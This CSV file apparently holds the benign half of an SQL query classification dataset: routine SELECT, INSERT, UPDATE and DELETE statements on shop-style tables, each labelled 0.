query,label
"SELECT * FROM users WHERE id = 1",0
"SELECT * FROM products WHERE name = 'laptop'",0
"SELECT id, username FROM users WHERE active = 1",0
"INSERT INTO orders (user_id, product_id) VALUES (5, 10)",0
"UPDATE users SET email = 'john@example.com' WHERE id = 3",0
"DELETE FROM sessions WHERE expired = 1",0
"SELECT * FROM employees WHERE department = 'Engineering'",0
"SELECT count(*) FROM orders WHERE status = 'pending'",0
"SELECT name, price FROM products WHERE category = 'electronics'",0
"SELECT * FROM users WHERE username = 'admin'",0
"INSERT INTO logs (action, timestamp) VALUES ('login', NOW())",0
"SELECT * FROM customers WHERE email = 'user@test.com'",0
"UPDATE products SET stock = stock - 1 WHERE id = 42",0
"SELECT order_id, total FROM orders WHERE user_id = 15",0
"SELECT * FROM items WHERE price BETWEEN 10 AND 100",0
"SELECT * FROM users WHERE created_at > '2024-01-01'",0
"SELECT username, email FROM users LIMIT 10",0
"SELECT * FROM products ORDER BY price DESC",0
"SELECT DISTINCT category FROM products",0
"SELECT * FROM users WHERE role = 'customer'",0
"SELECT * FROM orders WHERE total > 500",0
"INSERT INTO reviews (user_id, rating, comment) VALUES (8, 5, 'Great!')",0
"SELECT * FROM products WHERE name LIKE '%phone%'",0
"SELECT user_id, count(*) FROM orders GROUP BY user_id",0
"SELECT * FROM users WHERE id IN (1, 2, 3)",0
"UPDATE users SET last_login = NOW() WHERE id = 7",0
"SELECT * FROM categories WHERE parent_id IS NULL",0
"SELECT * FROM users JOIN orders ON users.id = orders.user_id",0
"SELECT product_name, SUM(quantity) FROM sales GROUP BY product_name",0
"SELECT * FROM users WHERE username = 'john_doe' AND active = 1",0
"SELECT * FROM products WHERE stock > 0 ORDER BY name",0
"INSERT INTO cart (user_id, product_id, quantity) VALUES (12, 5, 2)",0
"SELECT * FROM orders WHERE status = 'shipped' AND user_id = 9",0
"UPDATE products SET price = 29.99 WHERE id = 15",0
"SELECT * FROM users WHERE email_verified = 1",0
"SELECT id, title FROM articles WHERE published = 1",0
"SELECT * FROM comments WHERE article_id = 23 ORDER BY created_at",0
"DELETE FROM cart WHERE user_id = 4 AND product_id = 8",0
"SELECT * FROM products WHERE discount > 0",0
"SELECT username FROM users WHERE id = (SELECT user_id FROM sessions WHERE token = 'abc123')",0
"SELECT * FROM users WHERE registration_date >= '2023-01-01'",0
"INSERT INTO notifications (user_id, message) VALUES (6, 'New order')",0
"SELECT * FROM orders JOIN products ON orders.product_id = products.id",0
"SELECT * FROM users WHERE phone_number = '123-456-7890'",0
"UPDATE orders SET status = 'delivered' WHERE id = 100",0
"SELECT * FROM products WHERE rating >= 4.5",0
"SELECT * FROM users WHERE last_name = 'Smith'",0
"SELECT order_date, total FROM orders WHERE MONTH(order_date) = 12",0
"SELECT * FROM inventory WHERE warehouse = 'A' AND quantity < 10",0
"SELECT * FROM users WHERE account_type = 'premium'",0
"SELECT * FROM products WHERE brand = 'Apple' OR brand = 'Samsung'",0
"INSERT INTO addresses (user_id, street, city) VALUES (3, '123 Main St', 'NYC')",0
"SELECT * FROM orders WHERE payment_method = 'credit_card'",0
"SELECT username, email FROM users WHERE newsletter_subscribed = 1",0
"SELECT * FROM products WHERE weight < 5.0",0
"UPDATE users SET profile_complete = 1 WHERE id = 11",0
"SELECT * FROM categories ORDER BY sort_order ASC",0
"SELECT * FROM users WHERE referral_code = 'SAVE20'",0
"SELECT * FROM orders WHERE shipping_cost = 0",0
"SELECT * FROM products WHERE release_date = '2024-06-15'",0
"SELECT * FROM users WHERE login_attempts < 3",0
"SELECT * FROM items WHERE condition = 'new'",0
"INSERT INTO wishlist (user_id, product_id) VALUES (14, 22)",0
"SELECT * FROM products WHERE color = 'black' AND size = 'XL'",0
"SELECT * FROM users WHERE timezone = 'UTC-5'",0
"SELECT * FROM orders WHERE tracking_number IS NOT NULL",0
"UPDATE products SET featured = 1 WHERE id IN (10, 20, 30)",0
"SELECT * FROM users WHERE password_reset_token IS NULL",0
"SELECT * FROM products WHERE manufacturer = 'Sony'",0
"SELECT * FROM orders WHERE coupon_code = 'SUMMER10'",0
"SELECT id, name FROM users WHERE country = 'USA'",0
"SELECT * FROM products WHERE tags LIKE '%wireless%'",0
"SELECT * FROM users WHERE two_factor_enabled = 1",0
